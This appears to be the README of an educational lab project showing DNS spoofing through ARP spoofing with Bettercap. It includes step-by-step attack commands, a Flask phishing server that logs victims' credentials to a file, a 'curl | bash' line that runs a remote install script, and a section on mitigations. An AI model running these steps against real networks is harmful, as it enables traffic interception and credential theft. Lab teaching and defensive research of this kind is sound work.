# DNS Spoofing Attack in a Controlled Environment

This repository contains the material and documentation necessary to replicate a **DNS Spoofing** attack in a controlled laboratory environment. The project demonstrates how an attacker in the same local network can intercept and manipulate DNS traffic using **ARP Spoofing**, redirecting the victim to a malicious server.

## 📋 Table of Contents
- [Laboratory Scenario](#laboratory-scenario)
- [Prerequisites](#prerequisites)
- [Installation and Configuration](#installation-and-configuration)
- [Attack Execution (Step-by-Step)](#attack-execution-step-by-step)
  - [1. Phishing Server Configuration](#1-phishing-server-configuration)
  - [2. Running Bettercap](#2-running-bettercap)
- [Verification and Evidence](#verification-and-evidence)
- [Mitigation and Defense](#mitigation-and-defense)
- [References](#references)

---

## 🏰 Laboratory Scenario

The laboratory simulates a LAN network segment using virtualization.

| Role | OS | Key Tool | IP (Example) | MAC (Example) |
| :--- | :--- | :--- | :--- | :--- |
| **Attacker** | Kali Linux | Bettercap, Flask | `192.168.0.116` | `7f:c8...` |
| **Victim** | Windows 10 | Web Browser | `192.168.0.117` | `78:66...` |
| **Gateway** | (Virtual) | - | `192.168.0.0` | `50:98...` |

**Topology**: Both machines must be configured in **Bridged** mode in VMware to be on the same physical or virtual network segment.

---

## 🛠 Prerequisites

1. **VMware Workstation or Player**.
2. **Kali Linux Virtual Machine** (Attacker) with internet access.
3. **Windows 10 Virtual Machine** (Victim).
4. **Python 3** installed on Kali Linux.
5. **Bettercap** installed on Kali Linux.

---

## ⚙️ Installation and Configuration

### On the Attacker Machine (Kali Linux)

1. **Clone the repository**:
   ```bash
   git clone https://github.com/BrDenky/DNSAttack.git
   cd DNSAttack
   ```

2. **Install Python dependencies (Flask)**:
   ```bash
   pip install flask
   ```
   *Or if you prefer to use the automatic installation script mentioned in the report:*
   ```bash
   curl -sSL https://gist.github.com/BrDenky/bcc41c9546a22c59d7eb4d2c4e208825/raw/install.sh | bash
   ```

3. **Install Bettercap**:
   ```bash
   sudo apt update
   sudo apt install bettercap
   ```

---

## 🚀 Attack Execution (Step-by-Step)

### 1. Phishing Server Configuration

The fake web server will capture the victim's credentials. This server serves the `index.html` file and listens on port 80.

1. Ensure port 80 is free.
2. Run the server with superuser permissions (required for port 80):
   ```bash
   sudo python3 server.py
   ```
   *The server will wait for connections. Captured credentials will be saved in `creds.txt`.*

### 2. Running Bettercap

In a **new terminal** on Kali Linux, we will start the Man-in-the-Middle (ARP Spoofing) and DNS Spoofing attack.

1. **Start Bettercap** selecting the network interface (e.g., `eth0`):
   ```bash
   sudo bettercap -iface eth0
   ```

2. **Configure the target (Victim)**:
   Inside the bettercap interactive console:
   ```bash
   # Scan the network to find the victim
   net.probe on
   
   # List found devices
   net.show
   
   # Set the victim's IP as the target (Replace with actual IP)
   set arp.spoof.targets 192.168.0.117
   ```

3. **Start ARP Spoofing**:
   ```bash
   arp.spoof on
   ```
   *At this point, the victim's traffic passes through your machine.*

4. **Configure DNS Spoofing**:
   We will redirect a legitimate domain (e.g., `example.com` or `fakebank.test`) to our IP (Attacker).
   ```bash
   # Domain we want to spoof
   set dns.spoof.domains example.com
   
   # Malicious server IP (Your Kali IP)
   set dns.spoof.address 192.168.0.116
   
   # Start the DNS Spoofing module
   dns.spoof on
   ```

---

## 🕵️ Verification and Evidence

To confirm the attack is successful, perform the following tests on the **Victim Machine (Windows 10)**:

1. **Check ARP Table (Confirm Poisoning)**:
   ```cmd
   arp -a
   ```
   *Look for the Gateway IP. The physical address (MAC) should now be the same as the attacker machine's (Kali), indicating ARP Spoofing is working.*

2. **Flush DNS Cache**:
   ```cmd
   ipconfig /flushdns
   ```

3. **DNS Resolution Test**:
   ```cmd
   nslookup example.com
   ```
   *The response should be the attacker's IP (`192.168.0.116`) instead of the domain's real IP.*

4. **Browsing Test**:
   Open the browser and go to `http://example.com`. You should see the fake page served by `server.py`.

5. **Credential Capture**:
   If the victim enters data into the fake form, check the `creds.txt` file on the attacker machine:
   ```bash
   cat creds.txt
   ```

---

## 🛡 Mitigation and Defense

The report details strategies to defend against this attack:

### 1. Static ARP Mapping (Layer 2 Defense)
Prevents the ARP table from being dynamically modified by attackers.

**On Windows (Admin):**
```cmd
netsh interface ipv4 add neighbors "InterfaceName" <Gateway_IP> <Gateway_Real_MAC>
```
*Example:*
```cmd
netsh interface ipv4 add neighbors "Ethernet0" 192.168.0.1 00-50-56-f6-56-f6
```

### 2. DNS Traffic Restriction (Layer 3 Defense)
Configure the Firewall to accept DNS responses (UDP/53) **only** from the legitimate Gateway.

### 3. Use Encrypted DNS (DoH / DoT)
Use protocols that encrypt and authenticate DNS queries, preventing manipulation in transit.

---

## 📄 References

This project is primarily based on research papers (available in the `Annex/` directory) provided the theoretical foundation and comparative data for this work:

1. **A. Budiansyah et al.** - *"Detection of DNS spoofing attacks on campus networks using LightGBM with hybrid feature selection (SelectKBest + SHAP)"* (2025).
2. **U. Aijaz, M. Misbahuddin, & S. Raziuddin** - *"Survey on DNS-specific security issues and solution approaches"* (2021).
3. **Y. Afek & H. Berger** - *"POPS: From history to mitigation of DNS cache poisoning attacks"* (2025).
4. **T. R. Kukutla** - *"A deep dive into DNS spoofing and security measures"* (2023).
5. **Q. Li et al.** - *"Survey on DNS recursive resolution service security technology: Threats, defenses, and measurements"* (2025).
6. **H. Gattu, J. Karimireddy, & K. G** - *"DNS under siege: Ethical DNS spoofing and countermeasures"* (2025).
7. **Z. Cekerevac** - *"Firewall-based defense strategies against man-in-the-middle attacks"* (2025).
8. **M. Dawood et al.** - *"The impact of domain name server (DNS) over hypertext transfer protocol secure (HTTPS) on cyber security"* (2024).
9. **H. M. Al-Mimi et al.** - *"Improved intrusion detection system to alleviate attacks on DNS service"* (2023).
10. **M. Pardo Fernández et al.** - *"Implementación y análisis de los mecanismos de seguridad de DNS"* (2025).
